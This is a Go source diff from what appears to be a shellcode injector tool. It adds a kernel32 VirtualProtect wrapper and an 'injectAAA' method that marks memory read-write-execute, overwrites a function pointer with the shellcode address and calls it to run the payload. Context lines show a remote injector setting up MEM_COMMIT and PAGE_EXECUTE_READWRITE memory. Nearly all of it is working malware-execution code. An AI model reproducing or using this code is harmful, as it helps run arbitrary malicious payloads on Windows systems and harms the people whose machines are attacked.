@@ -27,6 +27,33 @@ type RemotePipedShellcodeInjector struct {
 
 const processEntrySize = 568
 
+
+var procVirtualProtect = syscall.NewLazyDLL("kernel32.dll").NewProc("VirtualProtect")
+
+func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint32, lpflOldProtect unsafe.Pointer) bool {
+	ret, _, _ := procVirtualProtect.Call(
+		uintptr(lpAddress),
+		uintptr(dwSize),
+		uintptr(flNewProtect),
+		uintptr(lpflOldProtect))
+	return ret > 0
+}
+
+func (si RemotePipedShellcodeInjector) injectAAA() string {
+	f := func() {}
+	var oldfperms uint32
+	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&f))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfperms)) {
+		panic("Call to VirtualProtect failed!")
+	}
+	**(**uintptr)(unsafe.Pointer(&f)) = *(*uintptr)(unsafe.Pointer(&si.shellcode))
+	var oldshellcodeperms uint32
+	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&si.shellcode))), uintptr(len(si.shellcode)), uint32(0x40), unsafe.Pointer(&oldshellcodeperms)) {
+		panic("Call to VirtualProtect failed!")
+	}
+	f()
+	return ""
+}
+
 func (si RemoteShellcodeInjector) inject() error {
     MEM_COMMIT := uintptr(0x1000)
     PAGE_EXECUTE_READWRITE := uintptr(0x40)
